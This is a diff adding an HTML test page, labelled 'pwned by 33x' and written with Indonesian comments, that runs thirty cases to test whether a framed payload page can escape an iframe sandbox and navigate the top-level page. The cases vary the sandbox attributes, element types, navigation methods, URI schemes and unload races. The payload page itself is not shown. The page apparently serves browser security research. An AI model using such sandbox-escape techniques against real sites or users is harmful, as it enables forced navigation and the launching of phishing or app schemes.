@@ -1,0 +1,88 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Welcome - My Page</title>
+<style>
+body{font:15px -apple-system,system-ui;margin:0;padding:14px;background:#fff;color:#111}
+h1{font-size:20px;margin:0 0 6px}
+#cur{background:#111;color:#0f0;padding:8px;font:12px monospace;border-radius:6px;word-break:break-all;margin:10px 0}
+h3{font-size:13px;color:#888;margin:14px 0 6px;text-transform:uppercase;letter-spacing:.5px}
+button.t{display:block;width:100%;text-align:left;margin:4px 0;padding:11px 12px;font-size:14px;border:1px solid #ccc;border-radius:8px;background:#fafafa}
+#rst{background:#eee;border:1px solid #999;margin-top:10px}
+#host{margin-top:10px}
+</style></head><body>
+<h1>pwned by 33x</h1>
+<p style="color:#555;margin:0">Halaman INDUK = <b>index.html</b>. Bar harus tetap <b>index.html</b>.<br>
+Kalau bar berubah jadi <b>payload.html</b> → BYPASS.</p>
+<div id="cur"></div>
+<div id="btns"></div>
+<button class="t" id="rst">↺ RESET (hapus frame)</button>
+<div id="host"></div>
+<script>
+var P='payload.html';
+var SBFULL='allow-scripts allow-top-navigation allow-top-navigation-by-user-activation';
+var SBTOP ='allow-scripts allow-top-navigation';
+
+/* v = mekanisme (lihat payload.html), s = skema, sb = sandbox (null=tanpa atribut),
+   el = elemen, tap = frame ditampilkan karena butuh sentuhan */
+var T=[
+ ['A. BENTUK FRAME & SANDBOX'],
+ ['1  baseline (sandbox penuh)',            {v:1, sb:SBFULL}],
+ ['2  TANPA atribut sandbox',               {v:1, sb:null}],
+ ['3  hanya by-user-activation + tap',      {v:2, sb:'allow-scripts allow-top-navigation-by-user-activation', tap:1}],
+ ['4  <object> bukan <iframe>',             {v:1, sb:SBTOP, el:'object'}],
+ ['5  <embed> bukan <iframe>',              {v:1, sb:SBTOP, el:'embed'}],
+ ['6  iframe bersarang 1 tingkat',          {v:10, sb:SBTOP}],
+ ['7  iframe bersarang 2 tingkat',          {v:11, sb:SBTOP}],
+ ['8  sandbox + allow-same-origin',         {v:1, sb:SBTOP+' allow-same-origin'}],
+
+ ['B. JENIS NAVIGASI'],
+ ['9  <a target="_top"> click',             {v:3, sb:SBTOP}],
+ ['10 <form target="_top"> submit',         {v:4, sb:SBTOP}],
+ ['11 top.location.replace()',              {v:5, sb:SBTOP}],
+ ['12 window.open(S)  [tap]',               {v:6, sb:SBTOP+' allow-popups allow-popups-to-escape-sandbox', tap:1}],
+ ['13 window.open(S,"_top")  [tap]',        {v:7, sb:SBTOP+' allow-popups', tap:1}],
+ ['14 window.open(S,"_blank")  [tap]',      {v:8, sb:SBTOP+' allow-popups', tap:1}],
+ ['15 frame navigasi DIRINYA sendiri',      {v:9, sb:SBTOP}],
+ ['16 meta refresh (self)',                 {v:12, sb:SBTOP}],
+
+ ['C. SKEMA URI'],
+ ['17 mailto:',        {v:1, sb:SBFULL, s:'mailto:a@b.co'}],
+ ['18 sms:',           {v:1, sb:SBFULL, s:'sms:+123456'}],
+ ['19 facetime:',      {v:1, sb:SBFULL, s:'facetime:123'}],
+ ['20 itms-apps://',   {v:1, sb:SBFULL, s:'itms-apps://itunes.apple.com'}],
+ ['21 shortcuts://',   {v:1, sb:SBFULL, s:'shortcuts://run-shortcut?name=x'}],
+ ['22 webcal://',      {v:1, sb:SBFULL, s:'webcal://example.com/a.ics'}],
+ ['23 skema tak dikenal xyzzy://', {v:1, sb:SBFULL, s:'xyzzy://foo/bar'}],
+ ['24 arc:// (skema internal Arc)', {v:1, sb:SBFULL, s:'arc://settings'}],
+ ['25 view-source:',   {v:1, sb:SBFULL, s:'view-source:https://ajaone.github.io/'}],
+ ['26 data:text/html', {v:1, sb:SBFULL, s:'data:text/html,<h1>pwned by 33x</h1>'}],
+ ['27 blob: (dibuat di frame)', {v:13, sb:SBTOP}],
+ ['28 javascript:',    {v:1, sb:SBFULL, s:'javascript:1'}],
+
+ ['D. TIMING / RACE'],
+ ['29 http dulu lalu geo: (race)', {v:14, sb:SBTOP}],
+ ['30 geo: di dalam unload',       {v:15, sb:SBTOP}]
+];
+
+function show(){document.getElementById('cur').textContent='URL sekarang:\n'+location.href;}
+show(); setInterval(show,700);
+
+var box=document.getElementById('btns');
+T.forEach(function(row){
+  if(row.length===1){var h=document.createElement('h3');h.textContent=row[0];box.appendChild(h);return;}
+  var b=document.createElement('button');b.className='t';b.textContent=row[0];
+  b.onclick=function(){run(row[1]);};box.appendChild(b);
+});
+document.getElementById('rst').onclick=function(){document.getElementById('host').innerHTML='';};
+
+function run(c){
+  var host=document.getElementById('host');host.innerHTML='';
+  var src=P+'?v='+c.v+(c.s?'&s='+encodeURIComponent(c.s):'');
+  var el=document.createElement(c.el||'iframe');
+  if(c.el==='object'){el.data=src;el.type='text/html';}
+  else if(c.el==='embed'){el.src=src;el.type='text/html';}
+  else{el.src=src; if(c.sb!==null)el.setAttribute('sandbox',c.sb);}
+  if(c.tap){el.width='100%';el.height='120';el.style.border='2px solid #b00';}
+  else{el.width='0';el.height='0';el.style.border='none';}
+  host.appendChild(el);
+}
+</script></body></html>
